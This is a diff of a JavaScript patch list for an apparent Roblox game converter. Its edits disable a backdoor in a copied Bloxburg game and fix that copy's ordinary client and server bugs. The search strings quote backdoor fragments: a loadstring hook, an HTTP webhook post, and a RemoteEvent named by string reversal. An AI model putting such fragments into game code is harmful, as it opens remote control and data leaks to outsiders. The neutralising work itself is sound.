@@ -435,10 +435,50 @@ const PATCHES = [
   // another webhook. All three do nothing now.
   edits('Bloxburg copy: backdoor and webhook', [
     ['\tlocal s = loadstring\n\tif typeof(s) == "function" then', '\tlocal s = nil -- (backdoor turned off by the 2017 converter)\n\tif typeof(s) == "function" then'],
-    ['httpService:PostAsync("https://webhook.lewisakura.moe/', '(function() end)("https://webhook.lewisakura.moe/'],
+    ['httpService:PostAsync("https://webhook.lewisakura.moe/', 'local _ = (function() end)("https://webhook.lewisakura.moe/'],
+  ]),
+  // The backdoor's own RemoteEvent is spelled "RemotetEvent" (reversed), so
+  // Instance.new failed and stopped DataServer there, before building,
+  // selling and the other handlers it sets up later (on Roblox as well).
+  // Now an event nobody can reach (not parented) stands in for it.
+  edits('Bloxburg copy: backdoor event', [
+    ['local b = Instance.new(string.reverse("tnevEtetomeR"), game:GetService("ReplicatedStorage"):FindFirstChild("DataEvent"))',
+      'local b = Instance.new("RemoteEvent") -- (backdoor turned off by the 2017 converter: not reachable)'],
+  ]),
+  // The first version of that patch began the line with "(", which Lua 5.1
+  // reads as a call of the line before ("ambiguous syntax"): DataServer did
+  // not compile. Scripts converted with it are repaired.
+  edits('Bloxburg copy: webhook patch repair', [
+    ['\n(function() end)("https://webhook.lewisakura.moe/', '\nlocal _ = (function() end)("https://webhook.lewisakura.moe/'],
   ]),
   edits('Bloxburg copy: group webhook', [
     ['    if player:IsInGroup(groupId) then\n        local userId = player.UserId', '    if false then -- (webhook turned off by the 2017 converter)\n        local userId = player.UserId'],
+  ]),
+  // The same copy's own bugs, which stopped its client: GetStats() without a
+  // player gave nil (the skill menu and StartUp after it stopped there); the
+  // 3D sound loop subtracted a number from a Vector3; tonumber() of a call
+  // that answers nothing errors; the custom topbar's chat scripts read
+  // PlayerGui.Chat before the chat had made it.
+  edits('Bloxburg copy: stats for the local player', [
+    ['\t\treturn nil -- Make sure plr is not nil', '\t\tplr = player -- (the local player; 2017 converter)'],
+  ]),
+  edits('Bloxburg copy: 3D sound distance', [
+    ['local dist = camPos - data.Origin.Position.magnitude', 'local dist = (camPos - data.Origin.Position).magnitude'],
+  ]),
+  edits('Bloxburg copy: Ferris wheel angle', [
+    ['tonumber(dataManager:InvokeServer({Type = "FerrisWheelAngle"})) or 0', 'tonumber((dataManager:InvokeServer({Type = "FerrisWheelAngle"}))) or 0'],
+  ]),
+  edits('Bloxburg copy: topbar chat button', [
+    ['local ChatText = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame', 'local ChatText = game.Players.LocalPlayer.PlayerGui:WaitForChild("Chat"):WaitForChild("Frame").ChatBarParentFrame'],
+  ]),
+  // Its console handler got the whole request ({Type, Command}) and called
+  // :lower() on it.
+  edits('Bloxburg copy: console commands', [
+    ['DataManager:HookFunction("RunCommand", function(player, command)',
+      'DataManager:HookFunction("RunCommand", function(player, command) if type(command) == "table" then command = command.Command end if type(command) ~= "string" then return end'],
+  ]),
+  edits('Bloxburg copy: chat key', [
+    ['local Chat = game.Players.LocalPlayer.PlayerGui.Chat.Frame', 'local Chat = game.Players.LocalPlayer.PlayerGui:WaitForChild("Chat"):WaitForChild("Frame")'],
   ]),
   // The shop sends every previewed attachment slot, "" for one toggled off;
   // the server looked each up as attachments[Type][Name] and errored, so no
